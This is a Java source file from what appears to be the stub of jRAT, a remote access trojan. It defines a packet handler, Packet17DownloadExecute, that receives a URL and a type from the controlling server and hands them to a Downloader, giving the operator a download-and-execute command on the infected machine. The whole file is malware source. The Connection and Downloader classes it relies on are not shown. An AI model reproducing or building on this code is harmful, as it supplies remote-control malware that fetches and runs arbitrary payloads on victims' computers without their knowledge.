package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Connection;
import pro.jrat.stub.Downloader;

public class Packet17DownloadExecute extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String url = Connection.readLine();
		String type = Connection.readLine();
		new Downloader(url, false, type).start();
	}

}